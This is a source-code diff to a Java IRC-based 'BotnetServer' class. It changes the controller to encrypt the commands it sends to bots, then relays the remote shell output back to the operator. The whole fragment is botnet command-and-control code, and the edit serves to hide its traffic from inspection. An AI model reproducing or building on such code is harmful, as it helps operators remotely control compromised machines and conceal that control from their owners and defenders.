@@ -347,8 +347,8 @@ public class BotnetServer extends PircBot {
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
 					// TODO: make this encrypted
-					//chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
-					chat.sendLine(command);
+					chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
+					//chat.sendLine(command);
 					String response = shellout.nextLine();
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
@@ -357,7 +357,8 @@ public class BotnetServer extends PircBot {
 					System.out.print(response);
 					command = input.nextLine();
 				}
-				chat.sendLine(command);
+				//chat.sendLine(command);
+				chat.sendLine(masterMsgE.encryptMsg(command));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
